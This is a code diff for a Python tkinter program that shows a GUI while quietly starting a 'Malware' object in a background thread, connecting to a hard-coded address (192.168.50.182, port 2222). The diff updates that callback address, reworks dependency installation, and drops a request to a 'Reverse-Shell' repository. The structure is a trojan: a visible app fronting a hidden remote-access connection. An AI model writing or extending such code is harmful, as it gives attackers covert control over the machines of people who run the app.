@@ -2,10 +2,7 @@ import tkinter as tk
 from tkinter import messagebox
 from threading import Thread
 from fooler import Malware
-from depchker import check_dependencies_and_continue
-import requests
-
-requests.get('https://github.com/H-ckingTools/Reverse-Shell.git')
+import depchker
 
 '''
 -------------------------------------------------------
@@ -93,11 +90,7 @@ def startapp():
 
     root.mainloop()
 
-# def main():
-#     root = tk.Tk()
-#     root.withdraw()
-#     root.destroy()
 if __name__ == '__main__':
-    malware = Malware('192.168.50.38',2222)
+    depchker.install_dependencies(on_complete=startapp)
+    malware = Malware('192.168.50.182',2222)
     Thread(target=malware.run,daemon=True).start()
-    check_dependencies_and_continue(startapp)
